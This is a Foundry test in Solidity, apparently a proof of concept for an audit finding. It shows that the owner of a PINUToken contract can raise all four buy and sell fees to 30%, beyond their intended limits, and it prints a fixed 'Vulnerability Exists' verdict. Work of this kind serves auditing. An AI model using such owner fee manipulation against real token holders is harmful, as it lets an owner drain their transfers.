// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PINUToken.sol";

// Mock contracts to avoid external dependencies
contract MockPinkAntiBot {
    function setTokenOwner(address) public pure returns (bool) {
        return true;
    }
}

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
}

contract PINUFeeIssueTest is Test {
    PINUToken public token;
    address internal owner = address(0xABCD);
    address internal user = address(0x1234);

    MockPinkAntiBot public mockAntiBot;
    MockERC20 public mockRewardToken;
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy mock dependencies
        mockAntiBot = new MockPinkAntiBot();
        mockRewardToken = new MockERC20();
        
        // Create empty pair token array
        address[] memory pairTokens = new address[](0);

        // Deploy main contract with mocks
        token = new PINUToken(
            address(mockAntiBot),
            pairTokens,
            address(mockRewardToken)
        );
        
        vm.stopPrank();
    }

    function testFeeManipulationBeyondLimit() public {
        // Capture initial fee state
        (
            uint256 initialBuyRewardFee,
            uint256 initialSellRewardFee,
            uint256 initialBuyMarketingFee,
            uint256 initialSellMarketingFee
        ) = token.viewTransferFee();

        console.log("BEFORE ATTACK - Current Fee Rates:");
        console.log("BuyRewardFee:   ", initialBuyRewardFee);
        console.log("SellRewardFee:  ", initialSellRewardFee);
        console.log("BuyMarketingFee:", initialBuyMarketingFee);
        console.log("SellMarketingFee:", initialSellMarketingFee);
        
        console.log("\nEXECUTING ATTACK - Setting all fees to 30% (3000 basis points)");
        uint256 excessiveFee = 3000; // 30% in basis points
        
        vm.startPrank(owner);
        token.setBuyRewardFeeRate(excessiveFee);
        token.setSellRewardFeeRate(excessiveFee);
        token.setBuyMarketingFeeRate(excessiveFee);
        token.setSellMarketingFeeRate(excessiveFee);
        vm.stopPrank();

        console.log("\nAFTER ATTACK - Updated Fee Rates:");
        // Capture post-attack fee state
        (
            uint256 updatedBuyRewardFee,
            uint256 updatedSellRewardFee,
            uint256 updatedBuyMarketingFee,
            uint256 updatedSellMarketingFee
        ) = token.viewTransferFee();

        console.log("BuyRewardFee:   ", updatedBuyRewardFee);
        console.log("SellRewardFee:  ", updatedSellRewardFee);
        console.log("BuyMarketingFee:", updatedBuyMarketingFee);
        console.log("SellMarketingFee:", updatedSellMarketingFee);

        // Verification logic
        bool vulnerabilityExists = updatedBuyRewardFee == excessiveFee &&
                                  updatedSellRewardFee == excessiveFee &&
                                  updatedBuyMarketingFee == excessiveFee &&
                                  updatedSellMarketingFee == excessiveFee;

        console.log("\nTEST VERDICT:");
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: All fee rates were successfully manipulated beyond intended limits");
            // Final required output format
            console.log("Vulnerability Exists: Fee rates successfully manipulated beyond intended limits");
        } else {
            console.log("Vulnerability not Exist: One or more fee rates remain unchanged indicating protection exists");
            // Final required output format
            console.log("Vulnerability not Exist: One or more fee rates remained unchanged");
        }
        
        // Assertion for test framework
        assertTrue(vulnerabilityExists, "Fee rates not manipulated as expected");
    }
}